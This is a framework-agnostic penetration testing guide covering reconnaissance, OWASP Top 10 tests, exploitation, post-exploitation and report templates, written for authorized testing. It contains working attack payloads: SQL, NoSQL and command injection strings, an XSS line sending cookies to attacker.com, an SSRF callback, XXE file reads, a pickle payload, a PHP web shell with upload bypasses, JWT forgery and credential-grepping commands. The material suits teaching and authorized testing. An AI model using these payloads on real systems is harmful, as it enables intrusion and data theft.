# Comprehensive Penetration Testing Guide

**Version**: 1.0
**Last Updated**: 2025-11-02
**Scope**: Generic framework-agnostic penetration testing methodology

---

## Table of Contents

1. [Overview](#overview)
2. [Penetration Testing Methodology](#penetration-testing-methodology)
3. [Pre-Engagement](#pre-engagement)
4. [Information Gathering (Reconnaissance)](#information-gathering-reconnaissance)
5. [Threat Modeling](#threat-modeling)
6. [Vulnerability Analysis](#vulnerability-analysis)
7. [Exploitation](#exploitation)
8. [Post-Exploitation](#post-exploitation)
9. [Reporting](#reporting)
10. [Tool Arsenal](#tool-arsenal)
11. [Compliance Frameworks](#compliance-frameworks)
12. [Automated Security Testing](#automated-security-testing)

---

## Overview

### Purpose

This guide provides a comprehensive, framework-agnostic penetration testing methodology suitable for:
- Web applications
- APIs (REST, GraphQL, gRPC)
- Cloud infrastructure (AWS, Azure, GCP)
- Databases (SQL, NoSQL)
- Container environments (Docker, Kubernetes)
- CI/CD pipelines

### Ethical Hacking Principles

**CRITICAL**: Only test systems you own or have written authorization to test.

1. **Authorization First**: Obtain written permission before testing
2. **Scope Definition**: Clearly define what is and isn't in scope
3. **No Collateral Damage**: Avoid impacting production systems
4. **Disclosure**: Report vulnerabilities responsibly
5. **Documentation**: Maintain detailed records of all activities

### Penetration Testing vs Security Auditing

| Aspect | Penetration Testing | Security Auditing |
|--------|---------------------|-------------------|
| **Goal** | Find exploitable vulnerabilities | Verify compliance with standards |
| **Approach** | Adversarial (attacker mindset) | Checklist-based validation |
| **Depth** | Deep dive into specific areas | Broad coverage, shallow depth |
| **Output** | Exploit proof-of-concepts | Compliance reports |
| **Frequency** | Quarterly/annually | Continuous or periodic |

---

## Penetration Testing Methodology

### PTES (Penetration Testing Execution Standard)

```
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Pre-Engagement → Reconnaissance → Threat Modeling →       │
│  Vulnerability Analysis → Exploitation → Post-Exploitation │
│  → Reporting                                                │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### OWASP Testing Guide

**Web Application Testing**:
1. Information Gathering
2. Configuration and Deployment Management Testing
3. Identity Management Testing
4. Authentication Testing
5. Authorization Testing
6. Session Management Testing
7. Input Validation Testing
8. Error Handling Testing
9. Cryptography Testing
10. Business Logic Testing
11. Client-Side Testing

### NIST Cybersecurity Framework

**5 Core Functions**:
1. **Identify**: Asset inventory, risk assessment
2. **Protect**: Access controls, data security
3. **Detect**: Anomaly detection, monitoring
4. **Respond**: Incident response, mitigation
5. **Recover**: Recovery planning, improvements

---

## Pre-Engagement

### 1. Scope Definition

**Define Target Systems**:
```markdown
## In-Scope
- Production web application: https://app.example.com
- API endpoints: https://api.example.com/v1/*
- Database: PostgreSQL (indirect access only)
- Cloud infrastructure: AWS (eu-west-1)

## Out-of-Scope
- Third-party integrations (payment processors)
- Legacy systems (decommissioning in progress)
- Customer data (production databases)
```

### 2. Rules of Engagement (RoE)

```markdown
## Authorization
- Authorized By: [Name, Title]
- Authorization Date: [Date]
- Expiration Date: [Date]

## Testing Windows
- Weekdays: 09:00-17:00 UTC
- Weekends: Not allowed
- Blackout Dates: [Holidays, maintenance windows]

## Constraints
- No DoS/DDoS attacks
- No social engineering (unless explicitly authorized)
- No physical intrusion attempts
- No data exfiltration (stage only, don't download)

## Escalation Path
1. Project Contact: [Name, Email, Phone]
2. Security Team Lead: [Name, Email, Phone]
3. CISO: [Name, Email, Phone]

## Emergency Procedures
- If critical vulnerability found: Immediate escalation
- If system becomes unstable: Stop testing, notify contact
- If legal/compliance issue detected: Escalate to CISO
```

### 3. Non-Disclosure Agreement (NDA)

**Key Clauses**:
- Confidentiality of findings
- Secure handling of test artifacts
- Destruction of data post-engagement
- Disclosure timeline (responsible disclosure)

### 4. Test Environment Setup

**Isolated Test Environment**:
```bash
# Create isolated AWS VPC for testing
aws ec2 create-vpc --cidr-block 10.100.0.0/16 --tag-specifications 'ResourceType=vpc,Tags=[{Key=Name,Value=pentest-env}]'

# Launch Kali Linux instance for testing
aws ec2 run-instances \
  --image-id ami-xxxxx \  # Kali Linux AMI
  --instance-type t3.medium \
  --key-name pentest-key \
  --security-group-ids sg-xxxxx \
  --subnet-id subnet-xxxxx \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=pentest-workstation}]'
```

---

## Information Gathering (Reconnaissance)

### 1. Passive Reconnaissance (OSINT)

**No direct interaction with target systems**.

#### DNS Reconnaissance
```bash
# DNS enumeration
dig example.com ANY
nslookup example.com
host -a example.com

# Find subdomains (passive)
# Using SecurityTrails API
curl "https://api.securitytrails.com/v1/domain/example.com/subdomains" \
  -H "APIKEY: YOUR_API_KEY"

# Reverse DNS lookup
dig -x 192.0.2.1

# DNS history
# Check SecurityTrails, DNSDumpster, VirusTotal
```

#### WHOIS & Domain Information
```bash
# WHOIS lookup
whois example.com

# Historical WHOIS data
# Check DomainTools, WhoisXML API

# Certificate transparency logs
# https://crt.sh/?q=%.example.com
```

#### Search Engine Reconnaissance (Google Dorking)
```bash
# Find exposed files
site:example.com filetype:pdf
site:example.com filetype:xlsx

# Find exposed directories
site:example.com intitle:"index of"

# Find exposed admin panels
site:example.com inurl:admin
site:example.com inurl:login

# Find exposed config files
site:example.com filetype:env
site:example.com filetype:config

# Find exposed API keys
site:github.com "example.com" "API_KEY"
site:pastebin.com "example.com" "password"
```

#### Social Media & Public Repositories
```bash
# GitHub reconnaissance
# Search for organization repos
curl "https://api.github.com/orgs/ORGANIZATION/repos"

# Search for leaked secrets
# Use tools: truffleHog, gitrob, git-secrets

# LinkedIn reconnaissance
# Identify employees, technologies used, org structure
```

#### Web Archive Investigation
```bash
# Wayback Machine
curl "http://archive.org/wayback/available?url=example.com"

# Historical screenshots
# Check archive.org, Archive.is
```

### 2. Active Reconnaissance

**Direct interaction with target systems**.

#### Network Scanning
```bash
# Host discovery (ping sweep)
nmap -sn 192.0.2.0/24

# Port scanning (top 1000 ports)
nmap -sS -T4 -v 192.0.2.1

# Full port scan
nmap -p- -T4 192.0.2.1

# Service version detection
nmap -sV -T4 192.0.2.1

# OS detection
nmap -O 192.0.2.1

# Aggressive scan (OS, version, scripts, traceroute)
nmap -A 192.0.2.1

# Scan specific ports
nmap -p 80,443,8080,8443 192.0.2.1

# UDP scan (slower)
nmap -sU -p 53,161,500 192.0.2.1
```

#### Web Application Fingerprinting
```bash
# Technology detection
whatweb https://example.com

# WAF detection
wafw00f https://example.com

# CMS detection
wpscan --url https://example.com  # WordPress
droopescan scan drupal -u https://example.com  # Drupal

# HTTP headers analysis
curl -I https://example.com

# SSL/TLS analysis
sslyze --regular example.com

# Certificate inspection
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -text
```

#### Subdomain Enumeration
```bash
# DNS bruteforce
dnsrecon -d example.com -D /usr/share/wordlists/subdomains.txt -t brt

# Subdomain finder (multiple sources)
subfinder -d example.com

# Amass (comprehensive)
amass enum -d example.com

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u
```

#### Directory & File Discovery
```bash
# Dirb (directory bruteforce)
dirb https://example.com /usr/share/wordlists/dirb/common.txt

# Gobuster (faster)
gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Find backup files
gobuster dir -u https://example.com -w /usr/share/wordlists/backup_files.txt -x .bak,.old,.backup

# Find API endpoints
gobuster dir -u https://api.example.com -w /usr/share/wordlists/api-endpoints.txt
```

---

## Threat Modeling

### STRIDE Framework

| Threat | Description | Examples |
|--------|-------------|----------|
| **S**poofing | Impersonating user/system | Session hijacking, JWT forgery |
| **T**ampering | Modifying data | SQL injection, parameter tampering |
| **R**epudiation | Denying actions | Missing audit logs, unsigned transactions |
| **I**nformation Disclosure | Exposing sensitive data | Directory traversal, IDOR |
| **D**enial of Service | Degrading availability | Resource exhaustion, rate limit bypass |
| **E**levation of Privilege | Gaining unauthorized access | Privilege escalation, broken access control |

### Attack Surface Mapping

```markdown
## Web Application
- Public endpoints (authentication, registration)
- Authenticated endpoints (API, dashboard)
- Admin endpoints (user management, settings)
- File uploads
- Search functionality
- Export/import features

## API
- REST endpoints (/api/v1/*)
- GraphQL endpoint (/graphql)
- WebSocket connections
- Webhook receivers

## Infrastructure
- Load balancers
- Web servers (Nginx, Apache)
- Application servers (Gunicorn, uWSGI)
- Databases (PostgreSQL, Redis)
- Message queues (RabbitMQ, Kafka)
- Storage (S3, EBS)

## Authentication & Authorization
- Login mechanisms
- Session management
- JWT handling
- OAuth flows
- MFA implementation
- Password reset flows

## Data Flows
- User registration → Email verification → Account activation
- Login → Session creation → Dashboard access
- API request → Authentication → Authorization → Processing → Response
- File upload → Virus scan → Storage → URL generation
```

### Risk Prioritization

**CVSS v3.1 Severity Ratings**:
| Score | Severity | Action Required |
|-------|----------|-----------------|
| 9.0 - 10.0 | Critical | Immediate fix (0-24 hours) |
| 7.0 - 8.9 | High | Fix within 7 days |
| 4.0 - 6.9 | Medium | Fix within 30 days |
| 0.1 - 3.9 | Low | Fix within 90 days |
| 0.0 | None | Informational only |

---

## Vulnerability Analysis

### OWASP Top 10 (2021)

#### A01:2021 - Broken Access Control

**Tests**:
```bash
# Insecure Direct Object Reference (IDOR)
# Change user ID in request
curl -X GET "https://api.example.com/users/1234" -H "Authorization: Bearer TOKEN"
curl -X GET "https://api.example.com/users/5678" -H "Authorization: Bearer TOKEN"

# Path traversal
curl "https://example.com/download?file=../../../../etc/passwd"

# Missing function level access control
# Access admin endpoint as regular user
curl -X POST "https://api.example.com/admin/users" -H "Authorization: Bearer USER_TOKEN" -d '{"role":"admin"}'

# Horizontal privilege escalation
# User A accessing User B's resources
curl -X GET "https://api.example.com/profile?user_id=OTHER_USER_ID" -H "Authorization: Bearer USER_A_TOKEN"

# Vertical privilege escalation
# Regular user accessing admin functions
curl -X DELETE "https://api.example.com/users/123" -H "Authorization: Bearer REGULAR_USER_TOKEN"
```

#### A02:2021 - Cryptographic Failures

**Tests**:
```bash
# Weak SSL/TLS configuration
nmap --script ssl-enum-ciphers -p 443 example.com

# Missing HSTS
curl -I https://example.com | grep -i strict-transport-security

# Sensitive data in URL
# Check if passwords/tokens in URL query parameters

# Weak password hashing
# Check if using MD5, SHA1 (deprecated)

# Insecure random number generation
# Test session IDs, tokens for predictability
```

#### A03:2021 - Injection

**SQL Injection Tests**:
```bash
# Error-based SQL injection
curl "https://example.com/search?q=test'"
curl "https://example.com/search?q=test' OR '1'='1"

# Union-based SQL injection
curl "https://example.com/product?id=1 UNION SELECT NULL,username,password FROM users--"

# Blind SQL injection (boolean-based)
curl "https://example.com/product?id=1 AND 1=1"  # True
curl "https://example.com/product?id=1 AND 1=2"  # False

# Time-based blind SQL injection
curl "https://example.com/product?id=1 AND SLEEP(5)--"

# Automated SQL injection
sqlmap -u "https://example.com/product?id=1" --batch --level=5 --risk=3
```

**NoSQL Injection Tests**:
```bash
# MongoDB injection
curl -X POST "https://api.example.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Bypass authentication
curl -X POST "https://api.example.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'
```

**Command Injection Tests**:
```bash
# Basic command injection
curl "https://example.com/ping?host=8.8.8.8;ls"
curl "https://example.com/ping?host=8.8.8.8|whoami"
curl "https://example.com/ping?host=8.8.8.8`id`"
curl "https://example.com/ping?host=8.8.8.8%26%26cat%20/etc/passwd"

# Blind command injection (time-based)
curl "https://example.com/ping?host=8.8.8.8;sleep 10"
```

#### A04:2021 - Insecure Design

**Business Logic Tests**:
```bash
# Race condition in coupon application
# Apply same coupon multiple times simultaneously
for i in {1..10}; do
  curl -X POST "https://api.example.com/cart/apply-coupon" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"coupon": "SAVE50"}' &
done

# Negative quantity in cart
curl -X POST "https://api.example.com/cart/add" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"product_id": 123, "quantity": -5}'

# Price manipulation
curl -X POST "https://api.example.com/checkout" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"items": [{"id": 123, "price": 0.01, "quantity": 1}]}'

# Workflow bypass
# Skip payment step, go directly to order confirmation
curl -X POST "https://api.example.com/orders/confirm" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"cart_id": "abc123"}'
```

#### A05:2021 - Security Misconfiguration

**Tests**:
```bash
# Default credentials
# Try admin:admin, admin:password, root:root

# Directory listing enabled
curl https://example.com/uploads/

# Unnecessary HTTP methods
curl -X OPTIONS https://example.com

# Verbose error messages
curl "https://example.com/error-test" -v

# Security headers missing
curl -I https://example.com | grep -E "(X-Frame-Options|X-Content-Type-Options|Content-Security-Policy)"

# Debug mode enabled
curl https://example.com | grep -i "DEBUG\|TRACE\|development"

# Exposed .git directory
curl https://example.com/.git/config
```

#### A06:2021 - Vulnerable and Outdated Components

**Tests**:
```bash
# Identify technologies
whatweb https://example.com

# Check for known vulnerabilities
# Manually check against CVE databases or use:
retire.js --path https://example.com  # JavaScript libraries
safety check -r requirements.txt  # Python dependencies
npm audit  # Node.js dependencies

# Check Docker image vulnerabilities
docker scan my-app:latest

# Check infrastructure CVEs
# Use AWS Inspector, Azure Security Center, GCP Security Command Center
```

#### A07:2021 - Identification and Authentication Failures

**Tests**:
```bash
# Weak password policy
# Try registering with weak passwords: "password", "123456"

# Brute force protection
# Automated brute force attack
hydra -l admin -P /usr/share/wordlists/rockyou.txt https://example.com/login

# Session fixation
# Set session ID before authentication, check if persists after login

# Session timeout
# Wait X minutes, try accessing authenticated endpoints

# Credential stuffing
# Use breach compilation databases (ethical testing only!)

# Multi-factor authentication bypass
# Try accessing authenticated endpoints without MFA

# JWT vulnerabilities
# None algorithm attack
# Weak secret bruteforce
# Algorithm confusion (RS256 vs HS256)
```

#### A08:2021 - Software and Data Integrity Failures

**Tests**:
```bash
# Insecure deserialization
# Python pickle
echo "cos\nsystem\n(S'whoami'\ntR." | base64 | curl -X POST "https://api.example.com/data" -d @-

# Java deserialization
# Use ysoserial to generate payloads

# Unsigned software updates
# Check if software updates are signed

# CI/CD pipeline security
# Check if artifacts are verified
# Check for secret leakage in CI/CD logs
```

#### A09:2021 - Security Logging and Monitoring Failures

**Tests**:
```bash
# Log injection
curl -X POST "https://api.example.com/login" \
  -d 'username=admin%0A[CRITICAL] Fake admin login&password=test'

# Insufficient logging
# Perform sensitive actions, check if logged

# Log retention
# Ask: How long are logs retained?

# Monitoring effectiveness
# Trigger alerts intentionally, verify detection
```

#### A10:2021 - Server-Side Request Forgery (SSRF)

**Tests**:
```bash
# Basic SSRF
curl "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"  # AWS metadata

# Blind SSRF
curl "https://example.com/fetch?url=http://attacker.com/callback"

# SSRF via redirect
curl "https://example.com/fetch?url=http://redirect.com/to/metadata"

# DNS rebinding
# Use tools like singularity, rbndr

# Filter bypass
curl "https://example.com/fetch?url=http://127.0.0.1:8080"
curl "https://example.com/fetch?url=http://localhost:8080"
curl "https://example.com/fetch?url=http://0.0.0.0:8080"
curl "https://example.com/fetch?url=http://[::1]:8080"
```

---

## Exploitation

### Exploitation Principles

1. **Proof of Concept (PoC) Only**: Demonstrate vulnerability exists, don't cause damage
2. **Minimal Impact**: Use least invasive method to prove exploitability
3. **Document Everything**: Record all steps, screenshots, payloads
4. **Stop if Destructive**: If exploit could damage systems, stop and report

### Common Exploitation Techniques

#### Web Application Exploitation

**Cross-Site Scripting (XSS)**:
```html
<!-- Reflected XSS -->
<script>alert(document.cookie)</script>

<!-- Stored XSS -->
<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">

<!-- DOM-based XSS -->
<script>location.hash.substring(1)</script>

<!-- Bypass filters -->
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

**Cross-Site Request Forgery (CSRF)**:
```html
<!-- CSRF attack page -->
<html>
<body>
<form action="https://example.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**XML External Entity (XXE)**:
```xml
<!-- Read local files -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

#### API Exploitation

**Mass Assignment**:
```bash
# Update user role via mass assignment
curl -X PATCH "https://api.example.com/users/me" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name": "Alice", "role": "admin"}'  # role should not be updatable
```

**GraphQL Introspection**:
```bash
# Query GraphQL schema
curl -X POST "https://api.example.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{__schema{types{name,fields{name}}}}"}'

# GraphQL batching attack (DoS)
curl -X POST "https://api.example.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[{"query":"query{users{id,name}}"},{"query":"query{users{id,name}}"},...repeat 1000 times]'
```

#### Authentication Bypass

**JWT Attacks**:
```python
# None algorithm attack
import jwt

payload = {"user": "admin"}
token = jwt.encode(payload, None, algorithm="none")
# Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Weak secret brute force
# Use hashcat or john
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

#### File Upload Vulnerabilities

```bash
# Upload web shell
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Bypass extension filter
mv shell.php shell.php.jpg
mv shell.php shell.jpg.php
mv shell.php shell.php%00.jpg  # Null byte injection

# Access uploaded shell
curl "https://example.com/uploads/shell.php?cmd=whoami"
```

---

## Post-Exploitation

### Objectives

1. **Assess Impact**: Determine scope of compromise
2. **Maintain Access**: Establish persistence (ethical testing only, document then remove)
3. **Lateral Movement**: Test network segmentation
4. **Data Exfiltration Simulation**: Prove data access (don't actually exfiltrate sensitive data)

### Post-Exploitation Activities

**Privilege Escalation (Linux)**:
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo permissions
sudo -l

# Check for kernel exploits
uname -a
searchsploit linux kernel $(uname -r)

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*

# Check for writable files in PATH
echo $PATH | tr ':' '\n' | xargs ls -ld
```

**Privilege Escalation (Windows)**:
```powershell
# Check user privileges
whoami /priv

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check for always install elevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check scheduled tasks
schtasks /query /fo LIST /v
```

**Network Discovery**:
```bash
# Internal network scan
nmap -sn 10.0.0.0/8

# Find databases
nmap -p 3306,5432,27017,6379 10.0.0.0/8

# Check for sensitive files
find / -name "*.config" -o -name "*.conf" -o -name "*.yml" -o -name "*.yaml" 2>/dev/null | grep -v "/proc/"

# Search for credentials
grep -r "password\|api_key\|secret" /var/www/ 2>/dev/null
```

---

## Reporting

### Executive Summary

```markdown
# Penetration Testing Report - Executive Summary

## Engagement Details
- **Client**: [Company Name]
- **Testing Period**: [Start Date] - [End Date]
- **Tester**: [Name/Company]
- **Scope**: [Brief scope description]

## Overall Risk Rating
🔴 **HIGH RISK** - Critical vulnerabilities require immediate attention

## Key Findings

### Critical Issues (CVSS 9.0-10.0)
1. **SQL Injection in User Search** - Allows full database access
2. **Authentication Bypass via JWT Manipulation** - Access any user account

### High Issues (CVSS 7.0-8.9)
3. **Insecure Direct Object Reference in File Download** - Access any file
4. **Server-Side Request Forgery in Webhook Handler** - Access internal services

### Statistics
- **Total Vulnerabilities**: 24
- **Critical**: 2
- **High**: 2
- **Medium**: 12
- **Low**: 6
- **Informational**: 2

## Recommendations Priority

### Immediate (0-7 days)
1. Fix SQL injection vulnerability
2. Implement secure JWT validation

### Short-term (7-30 days)
3. Implement authorization checks for file downloads
4. Add SSRF protection to webhook handler

### Medium-term (30-90 days)
5. Deploy Web Application Firewall (WAF)
6. Implement security headers
7. Enable security logging and monitoring
```

### Technical Report Template

```markdown
# Vulnerability Report

## Vulnerability #1: SQL Injection in User Search

### Summary
The user search functionality is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries and gain full access to the application database.

### Severity
🔴 **CRITICAL** (CVSS 9.8)

### CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### Affected Component
- **URL**: https://example.com/api/v1/users/search
- **Parameter**: `q` (query parameter)
- **Method**: GET

### Vulnerability Details

#### Description
The application constructs SQL queries using unsanitized user input from the `q` parameter. This allows attackers to inject malicious SQL code that executes with the application's database privileges.

#### Proof of Concept

**Request**:
```http
GET /api/v1/users/search?q=test' UNION SELECT NULL,username,password,email FROM users-- HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Response**:
```json
{
  "results": [
    {"id": null, "name": "admin", "email": "5f4dcc3b5aa765d61d8327deb882cf99", "phone": "admin@example.com"}
  ]
}
```

**Evidence Screenshot**:
[Screenshot showing successful SQL injection]

#### Impact
- **Confidentiality**: Complete access to all database contents including user credentials
- **Integrity**: Ability to modify or delete database records
- **Availability**: Potential to drop tables or corrupt data
- **Compliance**: GDPR, PCI DSS violations due to data exposure

#### Business Impact
- Customer data breach
- Regulatory fines (GDPR: up to €20M or 4% of annual revenue)
- Reputational damage
- Loss of customer trust

### Affected Code (if available)
```python
# File: app/api/users.py, Line 45
def search_users(query):
    sql = f"SELECT * FROM users WHERE name LIKE '%{query}%'"  # VULNERABLE
    return db.execute(sql)
```

### Remediation

#### Recommended Fix
Use parameterized queries (prepared statements) to prevent SQL injection:

```python
# SECURE VERSION
def search_users(query):
    sql = "SELECT * FROM users WHERE name LIKE %s"
    return db.execute(sql, (f"%{query}%",))
```

#### Additional Recommendations
1. **Input Validation**: Implement whitelist-based validation for search queries
2. **Least Privilege**: Use database user with minimal permissions
3. **WAF**: Deploy Web Application Firewall with SQL injection rules
4. **Code Review**: Audit all database queries for similar issues
5. **Security Testing**: Implement automated SQL injection testing in CI/CD

### References
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [NIST SP 800-53 SI-10](https://nvd.nist.gov/800-53/Rev4/control/SI-10)

### Timeline
- **Discovered**: 2025-10-25
- **Reported**: 2025-10-26
- **Target Fix Date**: 2025-11-02 (7 days)
- **Verification Date**: 2025-11-09 (14 days)

### Retest Results
[To be completed after remediation]
```

---

## Tool Arsenal

### Reconnaissance
- **Nmap**: Network scanner
- **Masscan**: Fast port scanner
- **Amass**: Attack surface discovery
- **Subfinder**: Subdomain enumeration
- **TheHarvester**: OSINT data gathering

### Web Application Testing
- **Burp Suite Professional**: Comprehensive web app testing
- **OWASP ZAP**: Open-source web app scanner
- **Nikto**: Web server scanner
- **WPScan**: WordPress scanner
- **Wfuzz**: Web fuzzer

### Vulnerability Scanning
- **Nessus**: Commercial vulnerability scanner
- **OpenVAS**: Open-source vulnerability scanner
- **Nuclei**: Template-based scanner
- **Trivy**: Container vulnerability scanner

### Exploitation
- **Metasploit**: Exploitation framework
- **SQLMap**: SQL injection tool
- **BeEF**: Browser exploitation framework
- **Empire**: Post-exploitation framework

### Password Attacks
- **Hashcat**: Password cracker
- **John the Ripper**: Password cracker
- **Hydra**: Network brute forcer
- **CrackMapExec**: Network authentication testing

### Cloud Security
- **ScoutSuite**: Cloud security auditing (AWS, Azure, GCP)
- **Prowler**: AWS security assessment
- **CloudMapper**: Cloud infrastructure visualization
- **Pacu**: AWS exploitation framework

### Container Security
- **Docker Bench**: Docker security check
- **Kube-bench**: Kubernetes security check
- **Kubesec**: Kubernetes manifest security
- **Falco**: Runtime security monitoring

---

## Compliance Frameworks

### PCI DSS v4.0

**Penetration Testing Requirements**:
- **Requirement 11.4**: External and internal penetration testing at least annually
- **Requirement 11.4.1**: Penetration testing methodology must follow industry standards (NIST SP 800-115, OWASP, PTES)
- **Requirement 11.4.2**: Cover all system components and network segmentation controls
- **Requirement 11.4.3**: Test web applications via representative techniques
- **Requirement 11.4.4**: Exploitable vulnerabilities must be corrected and retested

### HIPAA

**Security Rule Requirements**:
- **§ 164.308(a)(8)**: Regular evaluation of security measures
- **§ 164.312(a)(2)(iv)**: Audit controls to monitor activity
- **§ 164.308(a)(1)(ii)(A)**: Risk analysis identifying vulnerabilities

### ISO 27001

**Control A.18.2.3**: Technical compliance review
- Regular technical compliance reviews
- Penetration testing of systems and networks
- Review of operating system access controls

### GDPR

**Article 32**: Security of processing
- Regular testing and evaluation of security measures
- Pseudonymization and encryption
- Ability to restore availability and access to data

---

## Automated Security Testing

### CI/CD Integration

**GitHub Actions Example**:
```yaml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 2 * * 1'  # Weekly on Monday at 2 AM

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # Dependency scanning
      - name: Run Snyk Security Scan
        uses: snyk/actions/python@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      # Secret scanning
      - name: TruffleHog Scan
        uses: trufflesecurity/trufflehog@main
        with:
          path: ./
          base: main
          head: HEAD

      # Container scanning
      - name: Trivy Container Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: 'myapp:latest'
          format: 'sarif'
          output: 'trivy-results.sarif'

      # SAST (Static Application Security Testing)
      - name: Semgrep Scan
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/owasp-top-ten

      # Upload results to GitHub Security
      - name: Upload to Security Tab
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: trivy-results.sarif
```

### Continuous Security Monitoring

**Falco for Runtime Security (Kubernetes)**:
```yaml
# falco-rules.yaml
- rule: Unexpected Network Activity
  desc: Detect unexpected network connections from containers
  condition: evt.type=connect and container and not allowed_outbound
  output: "Unexpected connection (user=%user.name container=%container.name dest=%fd.sip)"
  priority: WARNING

- rule: Sensitive File Read
  desc: Detect reads of sensitive files
  condition: open_read and container and fd.name in (sensitive_files)
  output: "Sensitive file read (user=%user.name file=%fd.name container=%container.name)"
  priority: CRITICAL
```

---

## Appendix

### Legal Disclaimer

This penetration testing guide is provided for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal under laws including:

- **USA**: Computer Fraud and Abuse Act (CFAA)
- **UK**: Computer Misuse Act 1990
- **EU**: Directive 2013/40/EU on attacks against information systems
- **International**: Various cybercrime laws

Always obtain written authorization before testing. The authors assume no liability for misuse.

### References

- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page)
- [NIST SP 800-115: Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)
- [SANS Penetration Testing Resources](https://www.sans.org/penetration-testing/)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)

---

**Document Version**: 1.0
**Last Updated**: 2025-11-02
**Next Review**: 2026-02-02
